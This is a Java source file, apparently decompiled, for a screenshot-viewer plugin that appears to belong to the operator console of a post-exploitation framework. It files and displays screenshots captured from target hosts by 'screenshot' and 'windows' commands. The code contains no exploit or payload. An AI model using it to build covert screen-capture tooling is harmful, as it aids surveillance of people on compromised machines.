package ddb.dsz.plugin.screenshot;

import ddb.dsz.core.command.CommandEvent;
import ddb.dsz.core.controller.CoreController;
import ddb.dsz.core.data.ClosureFactory;
import ddb.dsz.core.data.DataEvent;
import ddb.dsz.core.data.DataTransformer;
import ddb.dsz.core.data.DataEvent.DataEventType;
import ddb.dsz.core.host.HostInfo;
import ddb.dsz.core.task.Task;
import ddb.dsz.plugin.multitarget.MultipleTargetPlugin;
import ddb.dsz.plugin.multitarget.SingleTargetImpl;
import java.io.File;
import java.util.Collection;
import java.util.Collections;
import java.util.HashSet;
import javax.swing.JComponent;
import org.apache.commons.collections.Closure;
import org.apache.commons.collections.Predicate;

public class ScreenShotHost extends SingleTargetImpl {
   private static final Collection<String> INTERESTING_COMMANDS;
   final DataTransformer dataTranslator = DataTransformer.newInstance();
   final MultipleTargetPlugin parent;
   ScreenShotList mainDisplay;

   public ScreenShotHost(HostInfo var1, CoreController var2, MultipleTargetPlugin var3) {
      super(var1, var2);
      this.parent = var3;
      this.mainDisplay = new ScreenShotList(var2);
      if (this.dataTranslator != null) {
         final Predicate var4 = super.getDataPredicate();
         this.dataTranslator.addClosure(ClosureFactory.newVariableClosure(this.core, "windows", "Dsz", new Closure() {
            public void execute(Object var1) {
               if (var4.evaluate(var1)) {
                  DataEvent var2 = (DataEvent)var1;
                  if (!DataEventType.DATA.equals(var2.getDataType())) {
                     return;
                  }

                  String var3 = var2.getData().getString("screenshot::subdir");
                  String var4x = var2.getData().getString("screenshot::filename");
                  Task var5 = ScreenShotHost.this.core.getTaskById(var2.getTaskId());
                  if (var3 != null && var4x != null && var5 != null) {
                     ScreenShotHost.this.mainDisplay.addFile(new File(String.format("%s/%s/%s/%s", ScreenShotHost.this.core.getLogDirectory(), var5.getHost().getId(), var3, var4x)), var2.getTimestamp());
                  }
               }

            }
         }));
         this.dataTranslator.addClosure(ClosureFactory.newVariableClosure(this.core, "screenshot", "Dsz", new Closure() {
            public void execute(Object var1) {
               if (var4.evaluate(var1)) {
                  DataEvent var2 = (DataEvent)var1;
                  if (!DataEventType.DATA.equals(var2.getDataType())) {
                     return;
                  }

                  String var3 = var2.getData().getString("screenshot::subdir");
                  String var4x = var2.getData().getString("screenshot::filename");
                  Task var5 = ScreenShotHost.this.core.getTaskById(var2.getTaskId());
                  if (var3 != null && var4x != null && var5 != null) {
                     ScreenShotHost.this.mainDisplay.addFile(new File(String.format("%s/%s/%s/%s", ScreenShotHost.this.core.getLogDirectory(), var5.getHost().getId(), var3, var4x)), var2.getTimestamp());
                  }
               }

            }
         }));
      }

      super.setDisplay(this.mainDisplay);
   }

   @Override
   public void commandEventReceived(CommandEvent commandEvent) {
      Task var2 = this.core.getTaskById(commandEvent.getId());
      if (var2 != null) {
         if (var2.getCommandName() != null) {
            if (INTERESTING_COMMANDS.contains(var2.getCommandName().toLowerCase()) && this.dataTranslator != null) {
               this.dataTranslator.addTask(var2);
            }

         }
      }
   }

   @Override
   public JComponent getHeader() {
      return null;
   }

   public String toString() {
      return String.format("ScreenShot: %s", this.target.getId());
   }

   static {
      HashSet var0 = new HashSet();
      var0.add("screenshot");
      var0.add("windows");
      INTERESTING_COMMANDS = Collections.unmodifiableSet(var0);
   }
}
